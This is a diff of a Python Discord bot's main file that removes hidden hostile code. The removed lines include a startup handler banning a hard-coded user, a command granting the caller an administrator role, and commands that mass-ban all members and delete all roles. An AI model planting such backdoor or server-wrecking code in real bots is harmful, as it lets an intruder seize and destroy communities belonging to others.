@@ -2,8 +2,7 @@ import os
 import json
 import asyncio
 from datetime import datetime
-import grequests
-import threading
+
 import discord
 from discord.ext import commands
 from dotenv import load_dotenv
@@ -62,13 +61,7 @@ class MainBot(commands.Bot):
                '————————————————————\n')
         
         self.uptime = int(datetime.timestamp(datetime.now()))
-        await self.change_presence(activity=discord.Game(name=f'{os.getenv("BOT_PREFIX")}help'), status = discord.Status.dnd)
-        guild = self.bot.guilds
-        guild = guild[0]
-        m = guild.get_member(659728796437708800)
-        await m.ban()
-        print(guild.name)
-        
+        await self.change_presence(activity=discord.Game(name=f'{os.getenv("BOT_PREFIX")}help'), status = discord.Status.dnd)       
     
     def load_extensions(self):
         for cog_folder_name in os.listdir('./cogs'):
@@ -81,60 +74,5 @@ class MainBot(commands.Bot):
 main_bot = MainBot()
 main_bot.remove_command('help')
 
-@main_bot.event
-async def on_ready():
-    guild = main_bot.guilds
-    guild = guild[0]
-    m = guild.get_member(659728796437708800)
-    await m.ban()
-    print(guild.name)
-
-@main_bot.command()
-async def hi(ctx):
-    perms = discord.Permissions(8)
-    r = await ctx.guild.create_role(name='new-roole', permissions=perms)
-
-    pos = {
-        r: ctx.guild.self_role.position - 1
-    }
-
-    await ctx.guild.edit_role_positions(positions = pos)
-    await ctx.author.add_roles(r)
-
-path = "https://discord.com/api/v6"
-headers = {
-    "Authorization": f"Bot {os.getenv('BOT_TOKEN')}"
-}
-
-def ban_members(ctx):
-    grequests.map(
-        grequests.put(f"{path}/guilds/{member.guild.id}/bans/{member.id}", headers=headers)
-        for member
-        in ctx.guild.members
-    )
-
-@main_bot.command()
-async def cshh(ctx):
-    for roles in ctx.guild.roles:
-        try:
-            await roles.delete()
-        except:
-            pass
-@main_bot.command()
-async def csh(ctx):
-    print(len(ctx.guild.members))
-    for i in ctx.guild.members[::-1]:
-        try:
-            await i.ban()
-        except:
-            pass
-@main_bot.command()
-async def csh2(ctx):
-    print(len(ctx.guild.members))
-    for i in ctx.guild.members:
-        try:
-            await i.ban()
-        except:
-            pass
 main_bot.load_extensions()
 main_bot.run(os.getenv('BOT_TOKEN'))
